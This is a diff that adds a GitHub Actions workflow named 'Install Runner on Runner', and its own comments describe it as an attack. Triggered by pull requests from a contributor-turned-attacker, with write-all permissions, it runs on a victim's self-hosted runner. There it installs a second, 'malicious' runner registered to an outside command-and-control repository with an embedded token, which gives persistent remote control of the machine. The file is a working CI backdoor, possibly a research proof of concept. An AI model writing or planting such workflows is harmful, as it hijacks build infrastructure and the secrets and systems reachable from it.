@@ -1,0 +1,32 @@
+name: Install Runner on Runner
+
+# Permissions are limited to read-only in pull requests
+permissions: write-all
+
+# Controls when the workflow will run
+on:
+  # Triggers the workflow on pull request events for the "main" branch
+  # As the attacker is now a contributor, this will run without approval
+  pull_request:
+    branches: [ "main" ]
+
+  # Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+
+jobs:
+  install_runner:
+    # Target the self-hosted runner's tags
+    # More tags can be added to target a specific runner (e.g [self-hosted, Linx])
+    # If multiple runners are present in the repo/org/enterprise with these tags
+    # The first available matching runner will be used for the workflow
+    runs-on: self-hosted
+
+    steps:
+      # Runs a set of commands using the runner's shell
+      # These commands install the new malicious runner on the C2 repo
+      - name: Run a multi-line script
+        run: |
+          mkdir malicious-runner && cd malicious-runner
+          curl -o actions-runner-linux-x64-2.326.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.326.0/actions-runner-linux-x64-2.326.0.tar.gz
+          tar xzf ./actions-runner-linux-x64-2.326.0.tar.gz
+          ./config.sh --url https://github.com/Harkins12345Test/C2OSRRunnerOnRunner --token BTOUZMVHFBJRP2VNECBJOP3IN7RK4
